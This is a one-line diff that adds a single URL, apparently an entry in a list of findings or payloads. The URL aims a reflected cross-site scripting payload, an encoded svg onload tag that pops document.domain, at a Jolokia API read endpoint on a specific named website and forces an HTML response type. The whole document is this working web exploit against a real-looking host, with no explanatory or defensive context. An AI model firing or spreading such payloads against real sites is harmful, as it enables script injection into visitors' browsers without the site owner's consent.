@@ -1,0 +1,1 @@
+http://colorconsole.de/api/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
